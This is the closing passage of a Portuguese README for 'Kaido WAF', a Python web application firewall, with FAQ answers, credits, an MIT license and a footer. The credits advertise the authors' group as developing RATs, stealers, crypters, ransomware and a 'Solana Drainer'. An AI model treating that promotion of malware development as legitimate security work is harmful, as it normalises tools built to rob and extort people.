Mínimo. O WAF é assíncrono (aiohttp) e processa requisições em paralelo. Em modo `detect` ou `log`, o overhead é ainda menor pois não bloqueia. Estimativa: **< 5ms de latência adicional** por requisição.

### Posso usar com WebSockets?

O proxy reverso suporta upgrade de conexão (WebSocket), mas a detecção é aplicada apenas na requisição inicial de upgrade.

### Como faço backup das configurações?

O WAF é stateless — toda configuração está no `config.yaml`. Faça backup do arquivo e dos logs, se necessário.

### O Kaido WAF substitui um WAF de produção?

Para ambientes de alto risco, recomenda-se usar o Kaido WAF **em conjunto** com um WAF de borda (Cloudflare, AWS WAF) e um IDS/IPS (Snort, Suricata). O Kaido WAF é uma **camada adicional** de proteção.

### Preciso de Redis?

Não. O Redis é opcional e usado apenas para rate limiting distribuído. Sem Redis, o rate limiting funciona em memória (perde dados ao reiniciar).

### Como contribuir?

Faça um fork, implemente sua feature e abra um Pull Request. Todo detector novo é bem-vindo!

---

## 👑 Créditos

**Kaido WAF** foi criado, desenvolvido e é mantido por:

### **Gustavo** — Kaido Red Team

> **Gustavo** é Red Team, especialista em cyber segurança ofensiva, programador full stack e criador de ferramentas de segurança. O Kaido WAF é mais uma demonstração do seu compromisso em criar ferramentas de segurança de alto nível para a comunidade.

**Contato:**
- GitHub: [@zlostc](https://github.com/zlostc)

### Kaido Red Team

Red team ofensivo brasileiro focado em:
- 🔴 **Pentest Blackbox & Whitebox** — testes de intrusão completos
- 💀 **Malware Development** — RATs, stealers, crypters, loaders
- 🛡️ **Segurança Ofensiva e Defensiva** — WAF, hardening, blue team
- 🔍 **OSINT & Engenharia Reversa** — inteligência e análise de binários
- ⚡ **C2 & Arsenal Próprio** — KaidoKrypter, Kaido RAT, Kaido Ranso, Solana Drainer

### Mencões Especiais

- **b1/epy (Izy/Izydoor)** — Owner/CEO do Kaido Team, criador de todo o arsenal Kaido, mentor e inspiração
- **tec** — Red team core, operador principal, validação de ferramentas
- **Gustavo** — Red team core, programador full stack, validação de ferramentas
- **Ally** — Cachorro louco do hacking, agente auxiliar de desenvolvimento

### Agradecimentos

- Comunidade de segurança brasileira
- Desenvolvedores do aiohttp, Jinja2 e PyYAML
- Kaido Team — por existir e manter o espírito do hacking vivo

---

## 📄 Licença

**MIT License** — Copyright (c) 2026 **Gustavo — Kaido Red Team**

Permissão é concedida, gratuitamente, a qualquer pessoa que obtenha uma cópia deste software e dos arquivos de documentação associados (o "Software"), para lidar no Software sem restrições, incluindo, sem limitação, os direitos de usar, copiar, modificar, mesclar, publicar, distribuir, sublicenciar e/ou vender cópias do Software.

Veja o arquivo [LICENSE](LICENSE) para detalhes completos.

---

<div align="center">
  <p>
    <strong>⚔️ Kaido WAF — Protegendo aplicações, uma requisição por vez.</strong><br>
    <sub>Kaido Red Team &bull; Brasil &bull; 2026</sub>
  </p>
  <p>
    🌐 <a href="https://kaido.team">Kaido Team</a> •
    🐙 <a href="https://github.com/zlostc/kaido-waf">GitHub</a> •
  </p>
  <p>
    <sub>Feito com 💀 no Brasil — porque segurança não é brincadeira, mas a gente leva a sério.</sub>
  </p>
</div>
